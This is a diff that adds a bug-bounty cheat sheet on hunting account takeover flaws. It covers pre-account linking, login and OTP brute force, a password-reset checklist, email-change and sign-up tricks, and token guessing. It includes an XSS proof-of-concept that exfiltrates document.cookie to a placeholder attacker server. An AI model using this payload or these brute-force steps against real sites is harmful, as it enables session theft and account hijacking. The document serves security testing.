@@ -1,0 +1,59 @@
+Pre-Account Takeover:
+How to hunt :-
+    Try registering any email address without verifying it.
+    Try registering an account again, but this time with a different method, such as ‘sign up with Google’ from same email address.
+    Due to the fact that both email addresses are the same, the web application will link the two accounts.
+    Now try logging in using the specified password and username. Check to see whether you can see information from that account that was retrieved via Google.
+
+Account takeover due to Improper Rate limit:
+How to Hunt:-
+
+    capture the request at the login page, while providing username and password.
+    send it to intruder and Brute force it.
+    Analyze the response and length.
+
+password reset
+
+1. check if you are able to brute force the password reset OTP
+2. test for token predectability
+3. test for JWT misconfigurations
+4. check if the password reset endpoint is vulnerable to IDOR
+5. check if the password reset endpoint is vulnerable to Host Header injection
+6. check if the password reset endpoint is leaking the token or OTP in the HTTP response
+7. check if the application validates the OTP or Token
+8. test for HTTP parameter Pollution (HPP)
+
+ XSS to Account Takeover
+1. try to exfiltrate the cookies
+2. try to exfiltrate the Auth Token
+3. if the cookie's "domain" attribute is set, search for xss in the subdomains and use it to exfiltrate the cookies
+    - PoC Example:
+        ```html
+        
+        <script>
+            /*
+            this script will create a hidden <img> element
+            when the browser tries to load the image
+            the victim's cookies will be sent to your server
+            */
+
+            var new_img = document.createElement('img');
+            new_img.src = "http://yourserver/" + document.cookie;
+            new_img.style = 'display: none;'
+            document.body.appendChild(new_img);
+        </script>
+
+        ```
+Password or email change function :
+IF you try to change password and see email parameter in password change request, Try changing your email to victim email
+
+Sing-Up Function:
+IF you try to sing-up new account in target site, in email filed try set target email
+IF you try to sing-up new account in target site using 3rd party, in 3d party use phone number instead email then link 3rd account with target site.Then Go setting try link victim email in you account
+
+Rest Token:
+Try to use your REST Token with Target account. Hint: email=Target@email.com&code=$Attacker_TOKEN$
+Brute Force Rest Token if it is numeric. Hint : email=Target@email.com&code=$TOKEN$
+Try to figure out how the token are generated: 1. Generated based on TimeStamp OR ID of user OR email of user
+
+https://github.com/reddelexc/hackerone-reports/tree/master/tops_by_bug_type
